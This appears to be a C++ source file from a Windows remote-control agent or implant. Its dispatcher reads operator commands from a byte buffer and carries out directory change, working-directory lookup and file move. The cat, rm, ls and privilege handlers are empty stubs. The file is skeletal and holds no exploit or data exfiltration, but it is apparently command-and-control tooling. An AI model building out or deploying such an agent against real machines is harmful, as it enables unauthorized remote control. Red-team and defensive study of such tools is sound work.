#include "cmds.hpp"
#include <stdio.h>


enum CMD_ACTION_CODES {
	CMD_CODE_PS,
	CMD_CODE_CMD,
	CMD_CODE_CAT,
	CMD_CODE_LS,
	CMD_CODE_RM,
	CMD_CODE_MV,
	CMD_CODE_PWD,
	CMD_CODE_CD,
};



BOOL commanders::Dispatch(PBYTE Data, UINT size, PBYTE OutBuffer) {
	g_ByteMgr->InitRead(Data, size);
	g_ByteMgr->Write4(MSG_TYPE_OUTPUT);
	UINT TotalCommands = g_ByteMgr->Read4();
	g_ByteMgr->Write4(TotalCommands);
	for (INT i = 0; i < TotalCommands; i++) {
		UINT CmdCode = g_ByteMgr->Read4();
		switch (CmdCode)
		{
		case CMD_CODE_MV:
			do_mv();
			break;
		case CMD_CODE_PWD:
			do_pwd();
			break;
		case CMD_CODE_CD:
			do_cd();
			break;
		default:
			break;
		}

	}

	return TRUE;
}

void commanders::WriteError() {
	g_ByteMgr->Write4(STATUS_ERROR);
	g_ByteMgr->Write4(GetTeb()->LastErrorValue);
	return;
}

void commanders::do_getprivs() {
	return;
}



void commanders::do_cat() {
	return;
}

void commanders::do_rm() {
	return;
}

void commanders::do_ls() {
	return;
}


void commanders::do_cd() {
	g_ByteMgr->BeginTask();

	UINT DirLen = g_ByteMgr->Read4();
	PCHAR dir = g_ByteMgr->ReadString(DirLen);
	if (!hades->WinApis.SetCurrentDirectoryA(dir)) {
		printf("Failed CD\n");

		g_ByteMgr->EndErr(GetTeb()->LastErrorValue);
		goto CLEANUP;
	}
	printf("success CD\n");
	g_ByteMgr->EndOk();
CLEANUP:
	if (dir) { g_ByteMgr->FreeString(dir); }
	return;
}

void commanders::do_pwd() {
	
	UINT TaskID = g_ByteMgr->BeginTask();

	DWORD size = hades->WinApis.GetCurrentDirectoryA(0, NULL);
	PCHAR buf = AllocMemory<CHAR>(size);
	DWORD Res = hades->WinApis.GetCurrentDirectoryA(size, buf);
	if (Res == 0 || Res >= size) {
		printf("Failed pwd\n");

		g_ByteMgr->EndErr(GetTeb()->LastErrorValue);
		goto CLEANUP;
	}
	printf("%s\n", buf);

	g_ByteMgr->EndOkData((PBYTE)buf, Res);

CLEANUP:
	if (buf) { HeapFree(GetProcessHeap(), 0, buf); }
	return;

	return;
}

void commanders::do_mv() {
	UINT TaskID = g_ByteMgr->BeginTask();

	UINT srclen = g_ByteMgr->Read4();
	PCHAR src = g_ByteMgr->ReadString(srclen);
	UINT dstlen = g_ByteMgr->Read4();
	PCHAR dest = g_ByteMgr->ReadString(dstlen);

	if (!hades->WinApis.MoveFileA(src, dest)) {
		g_ByteMgr->EndErr(GetTeb()->LastErrorValue);
		goto CLEANUP;
	}
	g_ByteMgr->EndOk();

CLEANUP:
	if (src) { g_ByteMgr->FreeString(src); };
	if (dest) { g_ByteMgr->FreeString(dest); }
	return;

}




commanders* g_Commander = NULL;